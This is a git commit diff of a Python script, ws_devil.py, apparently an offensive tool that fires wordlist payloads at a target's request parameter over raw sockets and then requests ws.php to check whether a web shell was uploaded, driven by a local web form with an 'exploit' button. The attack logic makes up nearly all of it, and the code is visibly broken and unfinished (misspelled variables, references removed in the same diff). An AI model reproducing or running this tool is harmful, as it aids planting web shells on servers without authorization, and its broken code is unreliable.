7ea47cb409425478444854e718a21f04c173987f
UnknownAD <59281997+UnknownAD@users.noreply.github.com>
2020-08-06 06:50:15 -0700

    Update ws_devil.py

--- ws_devil.py
+++ ws_devil.py
@@ -1,31 +1,33 @@
+########################################################## STILL UNDER DEVELOPEMENT ###################################################################################
+
 import socket
-import urllib.parse as pr
-requirements=__import__("sys").argv
-url=requirements[1]
-method=requirements[2]
-data=requirements[3]
-indexlist=open(requirements[4],"r")
-wordlist=open(requirements[5],"r")
+import urllib.parse
+import threading
+
 def shell_upload():
     server1=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     server2=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    global url,method,data,indexlist,wordlist
+    global items
     isconnected=0
     try:
-        server1.connect((url.split("@")[0],80))
+        server1.connect((items['host'],80))
         isconnected=1
     except:
         print("[*] Unable To Reach The Server : (")
         __import__('sys').exit()
     if isconnected:
-        server2.connect((url.split("@")[0],80))
-        for index in indexlist:
-            for payload in wordlist:
+        data=input("$ enter parameter name> ")
+        method=input("$ set a method(default is GET) > ")
+        if method=="":
+            method="GET"
+        server2.connect((items['host'],80))
+        for index in items['path']:
+            for payload in items['payloads']:
                 paylaod=payload.format(index+'ws.php')
                 if method=="GET":
-                    query1=f'GET /{url.split(@)[1]}?{data}={pr(payload)} HTTP/1.1\r\nHost:{url.split("@")[0]}\r\nConnection: Close\r\n\r\n'
+                    query1=f'''GET /{items['host']}?{data}={urllib.parse.quote(payload)} HTTP/1.1\r\nHost:{items['host']}\r\nConnection: Close\r\n\r\n'''
                 elif method=='POST':
-                    query1=f'POST /{url.split(@)[1]} HTTP/1.1\r\nHost:{url.split("@")[0]}\r\nContent-Length:{len(data+"="+pr(payload))}\r\nContent-Type:application/x-www-urlencoded\r\nConnection: Close\r\n\r\n{data}={pr(payload)}'
+                    query1=f'''POST /{items['host']} HTTP/1.1\r\nHost:{items['host']}\r\nContent-Length:{len(data+"="+urllib.parse.quote(payload))}\r\nContent-Type:application/x-www-urlencoded\r\nConnection: Close\r\n\r\n{data}={urllib.parse.quote(payload)}'''
                 query2=f'GET /{index}'
                 server1.send(bytes(query1,"us-ascii"))
                 query2=f'GET /ws.php HTTP/1.1\r\nHost:{url.split("@")[0]}\r\nConnection: Close\r\n\r\n'
@@ -35,8 +37,34 @@ def shell_upload():
                     indexlist.close()
                     wordlist.close()
                     break
-hell_upload()
 
-    
-
-
+main_server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+main_server.bind(("localhost",8888))
+main_server.listen(1)
+print('[*] server is running on port 8888')
+while True:
+    conn,addr=main_server.accept()
+    body='''HTTP/1.0 OK\r\nConnection: Close\r\n\r\n
+    <!DOCTYPE HTML>
+    <form action="/" method="GET" style='font-family=helvetica;align:center'>
+    <input name="path" placeholder="path"><br>
+    <input name="host" placeholder="host"><br>
+    <input name="filename" placeholder="directionslist file path"><br>
+    <input name="payloads" placeholder="payloads file path"><br>
+    <input type="submit" value="exploit"></form>'''
+    first_line=conn.recv(2048).decode('us-ascii').split('\r\n')[0] #/?path=/index&host=domain&filename=c:/wordlist&payloads+path=idk
+    data=urllib.parse.unquote(first_line).replace('GET ','').replace('HTTP/1.1','').replace(' ','').replace('/?','').split("&")
+    for item in data:
+        if 'path=' in item:
+            path=item.replace('path=','')
+        if 'host=' in item:
+            host=item.replace('host=','')
+        if 'filename=' in item:
+            filename=item.replace('filename=','')
+        if 'payloads=' in item:
+            payloads=item.replace('payloads=','')
+            items={"payloads":payloads,"filename":filename,"path":path,"host":host}
+            print(items)
+    shell_upload()
+    conn.send(bytes(body,"us-ascii"))
+                                          ##############################################################
